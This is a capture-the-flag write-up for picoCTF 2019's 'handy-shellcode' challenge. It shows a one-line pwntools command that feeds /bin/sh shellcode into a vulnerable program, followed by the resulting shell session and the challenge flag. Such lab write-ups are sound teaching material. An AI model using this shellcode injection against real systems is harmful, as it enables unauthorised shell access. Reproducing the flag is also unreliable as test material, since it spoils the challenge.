# handy-shellcode
**Points:** 50

## Category
Binary Exploitation

## Task
This [program](https://2019shell1.picoctf.com/static/884e03d84d1888395564a0f871bb2c69/vuln) executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_0_24753fd2c78ac1a60682f0c924b23405 on the shell server. [Source](https://2019shell1.picoctf.com/static/884e03d84d1888395564a0f871bb2c69/vuln.c).

# Solution
Upon looking at the source code, it could be seen it the code is executing anything we enter as the input. We can simply get a proper [shellcode](http://shell-storm.org/shellcode/) and insert it as the input. Or even better, let python do all the work!
```bash
$ (python -c "import pwn; print(pwn.asm(pwn.shellcraft.sh()))"; cat) | ./vuln 
Enter your shellcode:
jhh///sh/bin��h�4$ri1�QjY�Q��1�j
                                X̀
Thanks! Executing now...
ls
flag.txt  vuln	vuln.c
cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_ce07e7f1}
```
We make use of the **pwntools** library of python to generate a shellcode to execute a terminal for us and _cat_ command is used to keep the STDIN open. Otherwise it would immediately close.

# Flag
> picoCTF{h4ndY_d4ndY_sh311c0d3_ce07e7f1}
